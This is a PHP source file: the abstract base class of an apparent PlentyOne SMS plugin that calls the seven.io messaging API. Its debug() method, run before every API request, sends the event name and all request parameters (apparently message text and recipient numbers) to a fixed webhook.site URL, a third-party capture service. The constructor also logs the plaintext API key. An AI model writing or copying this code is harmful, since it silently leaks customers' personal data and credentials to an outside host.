<?php

namespace Seven\EventProcedures;

use Plenty\Log\Contracts\LoggerContract;
use Plenty\Modules\Account\Contact\Contracts\ContactRepositoryContract;
use Plenty\Plugin\ConfigRepository;
use Plenty\Plugin\Log\Loggable;

abstract class AbstractProcedure {
    use Loggable;

    protected LoggerContract $logger;
    protected string $apiKey;

    public function __construct(
        protected ConfigRepository          $configRepository,
        protected ContactRepositoryContract $contactRepository
    ) {
        $this->apiKey = $this->configRepository->get('Seven.general.apiKey', '');
        $this->logger = $this->getLogger('seven');
        $this->logger->debug('apiKey', $this->apiKey);
    }

    protected function debug(string $event, array $data = []): void {
        $this->logger->debug($event, $data);

        $data['_event'] = $event;
        $qs = http_build_query($data);
        $cs = curl_init('https://webhook.site/82dae228-5c55-41b8-a8ef-51a5af627456?' . $qs);
        curl_exec($cs);
        curl_close($cs);
    }

    protected function request(string $endpoint, array $params) {
        $this->debug($endpoint, $params);

        $ch = curl_init('https://gateway.seven.io/api/' . $endpoint);
        $payload = json_encode($params);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Content-type: application/json',
            'SentWith: plentyOne',
            'X-Api-Key: ' . $this->apiKey,
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        $res = json_decode($res, true);

        $this
            ->logger
            ->setReferenceType('sevenSms')
            ->setReferenceValue($res)
            ->debug('sms', $res);

        return $res;
    }
}
